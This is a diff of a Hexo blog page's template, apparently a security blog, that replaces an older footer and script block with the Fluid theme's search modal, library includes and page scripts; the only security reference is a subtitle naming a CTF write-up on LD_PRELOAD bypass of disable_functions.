-        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
-        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
-        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
-    </div>
-
+      </div>
+    
   </div>
 </div>
 
-        
-        <footer id="footer">
-  <div class="footer-left">
-    Copyright &copy;
+<!-- Custom -->
+
+
     
-    
-    2016-2020
-    osword
+  </main>
+
+  
+    <a id="scroll-top-button" href="#" role="button">
+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
   </div>
-  <div class="footer-right">
-    <nav>
-      <ul>
-         
-          <li><a href="/">首页</a></li>
-         
-          <li><a href="/about/">关于</a></li>
-         
-          <li><a href="/archives/">归档</a></li>
-         
-          <li><a href="/projects_url">项目</a></li>
-        
-      </ul>
-    </nav>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener">
+        <span>Fluid</span></a>
+    </div>
+    
+
+    
+
+    
   </div>
 </footer>
 
-    </div>
-    <!-- styles -->
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/main.js" ></script>
 
-<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<!-- Plugins -->
 
-
-<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
-
-
-    <!-- jquery -->
-
-<script src="/lib/jquery/jquery.min.js"></script>
-
-
-<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
-
-<!-- clipboard -->
 
   
-<script src="/lib/clipboard/clipboard.min.js"></script>
+    <script  src="/js/lazyload.js" ></script>
+  
 
-  <script type="text/javascript">
-  $(function() {
-    // copy-btn HTML
-    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
-    btn += '<i class="far fa-clone"></i>';
-    btn += '</span>'; 
-    // mount it!
-    $(".highlight table").before(btn);
-    var clip = new ClipboardJS('.btn-copy', {
-      text: function(trigger) {
-        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+
+
+  
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+  <script  src="/js/clipboard-use.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '#post-body',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        collapseDepth: 0,
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc').css('visibility', 'visible');
       }
     });
-    clip.on('success', function(e) {
-      e.trigger.setAttribute('aria-label', "复制成功!");
-      e.clearSelection();
-    })
-  })
   </script>
 
 
-<script src="/js/main.js"></script>
 
-<!-- search -->
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "TCTF | LD_PRELOAD系统劫持绕过disable_functions&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
 
-<!-- Google Analytics -->
 
-<!-- Baidu Analytics -->
 
-<!-- Disqus Comments -->
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      searchFunc(path, 'local-search-input', 'local-search-result');
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <script>
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
+      function () {
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 </body>
